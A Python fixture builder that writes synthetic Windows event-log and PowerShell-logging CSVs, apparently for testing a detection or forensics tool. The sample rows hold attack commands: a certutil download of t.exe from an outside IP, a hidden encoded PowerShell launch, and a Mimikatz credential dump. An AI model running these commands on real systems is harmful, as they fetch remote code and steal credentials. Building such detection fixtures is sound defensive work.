"""Build synthetic windows_evtx / windows_pslogging shaped CSV exports."""

from __future__ import annotations

import csv
import json

_EVTX_COLS = ["RecordNumber", "TimeCreated", "EventId", "Level", "Provider",
             "Channel", "Computer", "UserId", "Payload", "SourceFile"]
_PS_COLS = ["time", "kind", "event_id", "computer", "user", "host_app",
           "path", "scriptblock_id", "fragments", "decoded", "text",
           "severity", "source", "notable"]


def write_evtx_csv(path, rows):
    with open(path, "w", newline="", encoding="utf-8-sig") as fh:
        w = csv.DictWriter(fh, fieldnames=_EVTX_COLS)
        w.writeheader()
        for r in rows:
            full = {c: "" for c in _EVTX_COLS}
            full.update(r)
            w.writerow(full)


def write_ps_csv(path, rows):
    with open(path, "w", newline="", encoding="utf-8-sig") as fh:
        w = csv.DictWriter(fh, fieldnames=_PS_COLS)
        w.writeheader()
        for r in rows:
            full = {c: "" for c in _PS_COLS}
            full.update(r)
            w.writerow(full)


def build_evtx(path):
    rows = [
        {"RecordNumber": "10", "TimeCreated": "2026-03-16T09:00:00Z",
         "EventId": "1102", "Channel": "Security", "Provider": "Eventlog",
         "Payload": json.dumps({"SubjectUserName": "WS01\\mallory"})},
        {"RecordNumber": "11", "TimeCreated": "2026-03-16T09:05:00Z",
         "EventId": "1", "Channel": "Microsoft-Windows-Sysmon/Operational",
         "Provider": "Microsoft-Windows-Sysmon",
         "Payload": json.dumps({
             "Image": "C:\\Windows\\System32\\certutil.exe",
             "CommandLine": "certutil.exe -urlcache -split -f "
                            "http://185.10.20.30/t.exe t.exe",
             "User": "WS01\\victim"})},
        {"RecordNumber": "12", "TimeCreated": "2026-03-16T09:10:00Z",
         "EventId": "4624", "Channel": "Security", "Provider": "Eventlog",
         "Payload": json.dumps({"TargetUserName": "victim"})},
    ]
    write_evtx_csv(path, rows)


def build_pslogging(path):
    rows = [
        {"time": "2026-03-16T09:20:00Z", "kind": "scriptblock",
         "event_id": "4104", "computer": "WS01", "user": "WS01\\victim",
         "scriptblock_id": "sb-1", "notable": "",
         "text": "powershell -nop -w hidden -enc SQBFAFgA..."},
        {"time": "2026-03-16T09:25:00Z", "kind": "scriptblock",
         "event_id": "4104", "computer": "WS01", "user": "WS01\\victim",
         "scriptblock_id": "sb-2", "notable": "",
         "text": "Invoke-Mimikatz sekurlsa::logonpasswords"},
        {"time": "2026-03-16T09:30:00Z", "kind": "scriptblock",
         "event_id": "4104", "computer": "WS01", "user": "WS01\\victim",
         "scriptblock_id": "sb-3", "notable": "",
         "text": "Get-ChildItem C:\\Users | Select Name"},
    ]
    write_ps_csv(path, rows)
